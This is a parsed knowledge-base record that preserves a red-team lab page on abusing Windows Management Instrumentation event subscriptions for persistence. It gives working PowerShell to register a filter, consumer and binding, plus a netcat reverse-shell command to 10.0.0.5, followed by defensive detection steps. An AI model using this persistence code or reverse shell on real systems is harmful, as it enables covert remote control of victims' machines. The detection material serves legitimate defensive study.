---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Abusing Windows Managent Instrumentation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1084-abusing-windows-managent-instrumentation-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Abusing Windows Managent Instrumentation](../../topics/offensive-security/abusing-windows-managent-instrumentation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1084-abusing-windows-managent-instrumentation-readme |
| name | Abusing Windows Managent Instrumentation |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/README.md |

## Preserved Source Material

````yaml
_asset_filenames:
- wmi-binding.png
- wmi-consumer.png
- wmi-filter-consumer-creation.png
- wmi-filter.png
- wmi-parser.png
- wmi-shell-system.png
- wmi-strings-grep.png
- wmi-strings-grep2.png
_body: "---\ndescription: Persistence, Privilege Escalation\n---\n\n# Abusing Windows Managent Instrumentation\n\nWMI events\
  \ are made up of 3 key pieces:\n\n* event filters - conditions that the system will listen for (i.e on new process created,\
  \ on new disk added, etc.)\n* event consumers - consumers can carry out actions when event filters are triggered (i.e run\
  \ a program, log to a log file, execute a script, etc.)\n* filter to consumer bindings - the gluing matter that marries\
  \ event filters and event consumers together in order for the event consumers to get invoked.\n\nWMI Events can be used\
  \ by both offenders (persistence, i.e launch payload when system is booted) as well as defenders (kill process evil.exe\
  \ on its creation).\n\n## Execution\n\nCreating `WMI __EVENTFILTER`, `WMI __EVENTCONSUMER` and `WMI __FILTERTOCONSUMERBINDING`:\n\
  \n{% code title=\"attacker@victim\" %}\n```csharp\n# WMI __EVENTFILTER\n$wmiParams = @{\n    ErrorAction = 'Stop'\n    NameSpace\
  \ = 'root\\subscription'\n}\n\n$wmiParams.Class = '__EventFilter'\n$wmiParams.Arguments = @{\n    Name = 'evil'\n    EventNamespace\
  \ = 'root\\CIMV2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance\
  \ ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200\"\n}\n$filterResult = Set-WmiInstance\
  \ @wmiParams\n\n# WMI __EVENTCONSUMER\n$wmiParams.Class = 'CommandLineEventConsumer'\n$wmiParams.Arguments = @{\n    Name\
  \ = 'evil'\n    ExecutablePath = \"C:\\shell.cmd\"\n}\n$consumerResult = Set-WmiInstance @wmiParams\n\n#WMI __FILTERTOCONSUMERBINDING\n\
  $wmiParams.Class = '__FilterToConsumerBinding'\n$wmiParams.Arguments = @{\n    Filter = $filterResult\n    Consumer = $consumerResult\n\
  }\n\n$bindingResult = Set-WmiInstance @wmiParams\n```\n{% endcode %}\n\nNote that the `ExecutablePath` property of the `__EVENTCONSUMER`\
  \ points to a rudimentary netcat reverse shell:\n\n{% code title=\"c:\\shell.cmd\" %}\n```csharp\nC:\\tools\\nc.exe 10.0.0.5\
  \ 443 -e C:\\Windows\\System32\\cmd.exe\n```\n{% endcode %}\n\n## Observations\n\nNote the process ancestry of the shell\
  \ - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:\n\n![](../../../.gitbook/assets/wmi-shell-system.png)\n\n\
  On the victim/suspected host, we can see all the regsitered WMI event filters, event consumers and their bindings and inspect\
  \ them for any malicious intents with these commands:\n\n{% code title=\"__EventFilter@victim\" %}\n```csharp\nGet-WmiObject\
  \ -Class __EventFilter -Namespace root\\subscription\n```\n{% endcode %}\n\nNote the `Query` property suggests this wmi\
  \ filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:\n\
  \n![](../../../.gitbook/assets/wmi-filter.png)\n\nEvent consumer, suggesting that the `shell.cmd` will be executed upon\
  \ invokation as specified in the property `ExecutablePath`:\n\n{% code title=\"__EventConsumer@victim\" %}\n```csharp\n\
  Get-WmiObject -Class __EventConsumer -Namespace root\\subscription\n```\n{% endcode %}\n\n![](../../../.gitbook/assets/wmi-consumer.png)\n\
  \n{% code title=\"__FilterToConsumerBinding@victim\" %}\n```csharp\nGet-WmiObject -Class __FilterToConsumerBinding -Namespace\
  \ root\\subscription\n```\n{% endcode %}\n\n![](../../../.gitbook/assets/wmi-binding.png)\n\nMicrosoft-Windows-WMI-Activity/Operational\
  \ contains logs for event `5861` that capture event filter and event consumer creations on the victim system:\n\n![](../../../.gitbook/assets/wmi-filter-consumer-creation.png)\n\
  \n## Inspection\n\nIf you suspect a host to be compromised and you want to inspect any `FilterToConsumer` bindings, you\
  \ can do it with PSRemoting and the commands shown above or you can try getting the file`%SystemRoot%\\System32\\wbem\\\
  Repository\\OBJECTS.DATA`\n\nThen you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI\\_Forensics)\
  \ by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like:\n\n```bash\n./PyWMIPersistenceFinder.py\
  \ OBJECTS.DATA\n```\n\n![](../../../.gitbook/assets/wmi-parser.png)\n\n### Strings + Grep\n\nIf you are limited to only\
  \ the native \\*nix/cygwin utils you have to hand, you can get a pretty good insight into the bindings with the following\
  \ command:\n\n```csharp\nstrings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color\n```\n\nBelow are the results:\n\
  \n![](../../../.gitbook/assets/wmi-strings-grep.png)\n\nFrom the above graphic, we can easily see that one binding connects\
  \ two evils - the evil consumer and the evil filter.\n\nNow that you know that you are dealing with `evil` filter and `evil`\
  \ consumer, use another rudimentary piped command to look into the evil further:\n\n```csharp\nstrings OBJECTS.DATA | grep\
  \ -i 'evil' -B3 -A2 --color\n```\n\nNote how we can get a pretty decent glimpse into the malicious WMI persistence even\
  \ with simple tools to hand - note the `C:\\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our\
  \ consumers and filters at the very [beginning](./#execution) of the lab:\n\n![](../../../.gitbook/assets/wmi-strings-grep2.png)\n\
  \n## References\n\nBased on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources\
  \ listed below:&#x20;\n\n{% embed url=\"https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/\"\
  \ %}\n\n{% embed url=\"https://www.youtube.com/watch?v=0SjMgnGwpq8\" %}\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1084\"\
  \ %}\n\n{% embed url=\"https://www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-with-powershell-part-1-what-it-is.html\"\
  \ %}\n\n{% embed url=\"https://pentestarmoury.com/2016/07/13/151/\" %}\n\n{% embed url=\"https://msdn.microsoft.com/en-us/library/aa394084%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396\"\
  \ %}\n\n{% embed url=\"https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5)\"\
  \ %}"
_relative_path: offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/README.md
````
